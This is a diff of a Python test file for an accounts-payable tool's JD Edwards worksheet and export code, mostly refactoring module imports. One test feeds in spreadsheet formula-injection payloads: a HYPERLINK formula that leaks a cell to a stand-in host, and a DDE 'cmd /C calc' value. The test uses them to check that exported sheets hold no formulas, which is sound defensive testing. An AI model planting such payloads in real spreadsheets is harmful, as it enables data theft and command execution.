@@ -11,7 +11,7 @@ import openpyxl
 import pytest
 
 from ap_coder.core.memory import vendor_key
-from ap_coder.erp import jde, jde_worksheet
+from ap_coder.erp import jde, jde_accounts, jde_settings, jde_worksheet, jde_zfiles
 from tests.erp.test_jde import AN8, BC, CREDIT, ON, QC, USD, _invoice
 
 ROOT = Path(__file__).resolve().parents[2]
@@ -19,7 +19,10 @@ ROOT = Path(__file__).resolve().parents[2]
 
 def _sheet(settings=None, accounts=(), vendors=()) -> openpyxl.Workbook:
     data = jde_worksheet.build(
-        settings or jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS), list(accounts), list(vendors), lambda name: ""
+        settings or jde_settings.JdeSettings(amount_mode=jde_settings.AMOUNT_GROSS),
+        list(accounts),
+        list(vendors),
+        lambda name: "",
     )
     return openpyxl.load_workbook(io.BytesIO(data))
 
@@ -63,20 +66,21 @@ def test_answers_are_applied_and_bad_ones_reported_never_guessed():
     data = _answer(wb, company="42", document_type="pz", decimals="Decimal point ($5.50 → 5.50)", po_matched="oui",
                    currencies="cad; usd", info__p0400047="ZJDE0001", amount_mode="something else",
                    user="FAR_TOO_LONG_USER", send_due_date="maybe")  # fmt: skip
-    result = jde_worksheet.read(data, jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS))
+    result = jde_worksheet.read(data, jde_settings.JdeSettings(amount_mode=jde_settings.AMOUNT_GROSS))
     s = result.settings
     assert (s.company_code, s.document_type, s.decimals, s.po_matched, s.currencies) == (
-        "00042", "PZ", jde.POINT, True, ["CAD", "USD"])  # fmt: skip
+        "00042", "PZ", jde_settings.POINT, True, ["CAD", "USD"])  # fmt: skip
     assert s.answers == {"info:p0400047": "ZJDE0001"} and s.an8_overrides == {
         vendor_key("Northwind IT Solutions Inc."): "10023"
     }
-    assert s.amount_mode == jde.AMOUNT_GROSS and s.user == "APCODER" and s.send_due_date  # kept: not understood
+    # kept: not understood
+    assert s.amount_mode == jde_settings.AMOUNT_GROSS and s.user == "APCODER" and s.send_due_date
     problems = " ".join(result.problems)
     assert "something else" in problems and "longer than 10" in problems and "yes or no" in problems
-    assert "code “Z”" in problems and s.tax_map["AB"] == jde.default_tax_map()["AB"]
+    assert "code “Z”" in problems and s.tax_map["AB"] == jde_settings.default_tax_map()["AB"]
     assert len(result.changes) == 6  # "cad; usd" is what AP Coder already had
     again = jde_worksheet.read(data, s)  # the same worksheet twice: nothing new
-    assert again.changes == [] and jde.JdeSettings.from_json(s.to_json()).answers == s.answers
+    assert again.changes == [] and jde_settings.JdeSettings.from_json(s.to_json()).answers == s.answers
 
 
 def test_the_drop_down_answer_and_a_mapping_row_round_trip():
@@ -85,14 +89,14 @@ def test_the_drop_down_answer_and_a_mapping_row_round_trip():
     acc["D2"], acc["E2"], acc["F2"] = "100", "6010", "01"
     data = _answer(wb, amount_mode="Taxable / non-taxable / tax amounts (VLATXA; VLATXN; VLSTAM): the tax printed on "
                    "the invoice", line_numbering="Match header")  # fmt: skip
-    s = jde_worksheet.read(data, jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS)).settings
-    assert s.amount_mode == jde.AMOUNT_TAX and s.line_numbering == jde.MATCH_HEADER
-    assert [jde.ani(m) for m in s.gl_map] == ["100.6010.01"]
+    s = jde_worksheet.read(data, jde_settings.JdeSettings(amount_mode=jde_settings.AMOUNT_GROSS)).settings
+    assert s.amount_mode == jde_settings.AMOUNT_TAX and s.line_numbering == jde_settings.MATCH_HEADER
+    assert [jde_accounts.ani(m) for m in s.gl_map] == ["100.6010.01"]
 
 
 def test_the_worksheet_holds_no_formula_from_a_document():
     evil = '=HYPERLINK("http://x.example/?"&A1,"Click")'
-    data = jde_worksheet.build(jde.JdeSettings(), [{"code": "6010", "description": "+cmd|' /C calc'!A0"}],
+    data = jde_worksheet.build(jde_settings.JdeSettings(), [{"code": "6010", "description": "+cmd|' /C calc'!A0"}],
                                [{"vendor_name": evil}], lambda name: "")  # fmt: skip
     wb = openpyxl.load_workbook(io.BytesIO(data))
     cells = [c for ws in wb.worksheets for row in ws.iter_rows() for c in row]
@@ -102,28 +106,34 @@ def test_the_worksheet_holds_no_formula_from_a_document():
 
 @pytest.mark.parametrize("content", [b"not a workbook", b"PK\x03\x04 broken zip"])
 def test_a_file_that_is_not_the_worksheet_is_refused(content):
-    result = jde_worksheet.read(content, jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS))
+    result = jde_worksheet.read(content, jde_settings.JdeSettings(amount_mode=jde_settings.AMOUNT_GROSS))
     assert result.changes == [] and "could not be opened" in result.problems[0]
     other = openpyxl.Workbook()
     buf = io.BytesIO()
     other.save(buf)
     assert (
         "not AP Coder's JDE worksheet"
-        in jde_worksheet.read(buf.getvalue(), jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS)).problems[0]
+        in jde_worksheet.read(buf.getvalue(), jde_settings.JdeSettings(amount_mode=jde_settings.AMOUNT_GROSS)).problems[
+            0
+        ]
     )
 
 
 def test_the_dry_run_says_what_loads_and_why_anything_is_held_back():
     invoices = [_invoice(ON, 1), _invoice(BC, 2), _invoice(QC, 3), _invoice(CREDIT, 4), _invoice(USD, 5)]
     unknown_usd = lambda final: "" if "cascade" in (final.get("vendor_name") or "").lower() else "10023"  # noqa: E731
-    report = jde.dry_run(invoices, jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS), unknown_usd, batch=12)
+    report = jde.dry_run(
+        invoices, jde_settings.JdeSettings(amount_mode=jde_settings.AMOUNT_GROSS), unknown_usd, batch=12
+    )
     assert [v["id"] for v in report["vouchers"]] == [1, 2, 3, 4] and [h["id"] for h in report["held"]] == [5]
     assert "AN8" in report["held"][0]["reasons"][0]
-    files = jde.export_batch(invoices[:4], jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS), AN8, batch=12)
+    files = jde_zfiles.export_batch(
+        invoices[:4], jde_settings.JdeSettings(amount_mode=jde_settings.AMOUNT_GROSS), AN8, batch=12
+    )
     rows = {name: len(data.decode().splitlines()) - 1 for name, data in files.items()}
     assert (
-        report["files"][jde.HEADER_FILE] == rows[jde.HEADER_FILE]
-        and report["files"][jde.DIST_FILE] == rows[jde.DIST_FILE]
+        report["files"][jde_zfiles.HEADER_FILE] == rows[jde_zfiles.HEADER_FILE]
+        and report["files"][jde_zfiles.DIST_FILE] == rows[jde_zfiles.DIST_FILE]
     )
     text = jde.dry_run_text(report)
     assert "Will load: 4 voucher(s)" in text and "HELD BACK  AP Coder #5" in text
@@ -133,7 +143,9 @@ def test_the_dry_run_says_what_loads_and_why_anything_is_held_back():
 
 
 def test_nothing_loads_while_a_setting_stops_every_export():
-    report = jde.dry_run([_invoice(ON, 1)], jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS, company="ABC"), AN8)
+    report = jde.dry_run(
+        [_invoice(ON, 1)], jde_settings.JdeSettings(amount_mode=jde_settings.AMOUNT_GROSS, company="ABC"), AN8
+    )
     assert report["vouchers"] == [] and report["held"][0]["reasons"] == ["the JD Edwards settings above"]
     assert "NOTHING CAN LOAD" in jde.dry_run_text(report)
 
@@ -141,7 +153,7 @@ def test_nothing_loads_while_a_setting_stops_every_export():
 def test_an_uncoded_line_is_held_back_in_plain_words():
     inv = _invoice(ON, 1)
     inv["final_output"]["gl_distribution"][0]["gl_code"] = "UNASSIGNED"
-    (reasons,) = jde.validate([inv], jde.JdeSettings(amount_mode=jde.AMOUNT_GROSS), AN8).values()
+    (reasons,) = jde.validate([inv], jde_settings.JdeSettings(amount_mode=jde_settings.AMOUNT_GROSS), AN8).values()
     assert any("has no GL account" in r and "review screen" in r for r in reasons)
     assert not any("too long" in r for r in reasons)
 
@@ -149,7 +161,7 @@ def test_an_uncoded_line_is_held_back_in_plain_words():
 def test_the_dry_run_gross_is_the_whole_invoice_in_every_amount_mode():
     """With taxable / non-taxable / tax amounts there is no gross column: the dry run adds the three up (from the
     VLC* columns for a foreign invoice), never shows the non-taxable part as the gross."""
-    settings = jde.JdeSettings(amount_mode=jde.AMOUNT_TAX, currencies=["CAD", "USD"])
+    settings = jde_settings.JdeSettings(amount_mode=jde_settings.AMOUNT_TAX, currencies=["CAD", "USD"])
     for inv in (_invoice(ON, 1), _invoice(ON, 2, currency="USD")):
         (voucher,) = jde.dry_run([inv], settings, AN8)["vouchers"]
         (item,) = voucher["pay_items"]
